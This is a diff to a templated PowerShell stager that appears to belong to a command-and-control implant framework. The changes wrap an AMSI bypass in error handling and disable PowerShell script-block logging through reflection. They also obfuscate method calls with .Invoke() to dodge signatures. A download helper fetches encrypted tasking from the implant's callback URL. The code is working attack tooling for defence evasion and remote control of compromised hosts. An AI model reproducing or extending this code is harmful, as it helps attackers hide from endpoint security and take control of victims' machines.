@@ -23,7 +23,11 @@ function {{symbol_name("Decrypt-String")}} {
 
 if ($PSVersionTable.PSVersion.Major -ge 5) {
     {% if amsibypass %}
+        try {
         {% include amsibypass %}
+        } catch {
+            Write-Error (-join ({{obfuscate("AMSI Bypass failed: ")}}, $_))
+        }
     {% endif %}
 
     {# Disable Logging. See https://www.cobbr.io/ScriptBlock-Logging-Bypass.html
@@ -33,7 +37,7 @@ if ($PSVersionTable.PSVersion.Major -ge 5) {
         $GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0
     #}
 
-    ${{symbol_name("settings")}} = [Ref].{{obfuscate("Assembly")}}.{{obfuscate("GetType")}}({{obfuscate("System.Management.Automation.Utils")}}).GetField({{obfuscate("cachedGroupPolicySettings")}},{{obfuscate("NonPublic,Static")}}).GetValue($null);
+    ${{symbol_name("settings")}} = [Ref].{{obfuscate("Assembly")}}.{{obfuscate("GetType")}}.Invoke({{obfuscate("System.Management.Automation.Utils")}}).{{obfuscate("GetField")}}.Invoke({{obfuscate("cachedGroupPolicySettings")}},{{obfuscate("NonPublic,Static")}}).GetValue($null);
     ${{symbol_name("settings")}}[{{obfuscate("ScriptBlockLogging")}}] = @{}
     ${{symbol_name("settings")}}[{{obfuscate("ScriptBlockLogging")}}].Add({{obfuscate("EnableScriptBlockLogging")}},{{obfuscate("0")}})
     ${{symbol_name("settings")}}[{{obfuscate("ScriptBlockLogging")}}].Add({{obfuscate("EnableScriptBlockInvocationLogging")}},{{obfuscate("0")}})
@@ -45,7 +49,7 @@ if ($PSVersionTable.PSVersion.Major -ge 5) {
         param([String]$1, [hashtable]$2=@{}, [Bool]$3=$False)
         $args = "?t={{transport}}"
         foreach($k in $2.keys) { $args += "&$k=$($2[$k])" }
-        return {{symbol_name("Decrypt-String")}} (${{symbol_name("WebClient")}}.{{obfuscate("DownloadString")}}("${{symbol_name("CALLBACK_URL")}}${1}${args}")) $3
+        return {{symbol_name("Decrypt-String")}} (${{symbol_name("WebClient")}}.{{obfuscate("DownloadString")}}.Invoke("${{symbol_name("CALLBACK_URL")}}${1}${args}")) $3
     }
 {% elif transport == 'smb' %}
     {# TODO #}
